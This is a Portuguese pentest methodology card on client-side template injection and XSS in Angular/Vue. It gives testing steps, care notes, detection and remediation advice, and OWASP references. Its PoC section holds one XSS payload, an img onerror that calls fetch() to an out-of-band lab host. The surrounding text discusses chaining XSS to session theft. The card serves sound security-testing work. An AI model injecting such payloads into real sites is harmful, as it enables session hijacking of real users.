---
id: "0158"
categoria: "06-client"
familia: "client-xss"
slug: "angular"
angulo: "base"
mitre: ""
owasp: "WSTG-INPV-01"
tags: ["06-client", "client-xss", "base"]
aliases: ["template injection client (Angular/Vue)", "angular"]
---

# template injection client (Angular/Vue)

## Contexto

XSS moderno raramente é `alert(1)`: o valor está em roubo de sessão, bypass de CSRF,
abuso de WebMessages e chain com CSP bypass. DOM XSS exige data flow (source→sink) real.

## Detalhe

- Detalhe que pago pra ver: **SSTI client-side**.
- Sink + contexto + cookie flags. Encadeio até ação autenticada ou token se HttpOnly falhar.

## Execução

1. Mapeio reflections e sinks DOM (innerHTML, location, postMessage).
2. Testo contextos (HTML, attr, JS, URL, CSS).
3. Avalio cookies HttpOnly e CSP.
4. Construir PoC de impacto (sessão de teste / ação).
5. Verifico mutação por sanitizers (DOMPurify misconfig).

## PoC mínimo

```html
<!-- reflected/stored lab payload — sem persistir em prod -->
<img src=x onerror="fetch('https://oast.lab.local/701689')">
<!-- sink angular: sessão USER_A / cookie flags -->
```

## OpSec

Não persisto payload em produção sem janela e plano de purge.

## Cuidados

Não capture sessões de usuários reais. Evito defacement.

## Fechamento

| | |
|---|---|
| Detecção | CSP reports; WAF XSS signatures; canary cookies. |
| Remediação | HttpOnly+Secure+SameSite; CSP nonce/hash; sanitização server+client;
Trusted Types. |
| Evidência | PoC HTML; cookie flags; impacto narrado. |

## Refs

- [WSTG-INPV-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## Relacionadas

- [template injection client (Angular/Vue) — lab](0538-client-xss-angular--lab.md)
- [template injection client (Angular/Vue) — hardening](0918-client-xss-angular--hardening.md)
- [XSS até account takeover](0160-client-xss-ato-chain.md)
- [CSP bypass gadgets](0155-client-xss-csp-bypass.md)
- [DOM XSS](0153-client-xss-dom.md)
- [mutation XSS (mXSS)](0156-client-xss-mutation.md)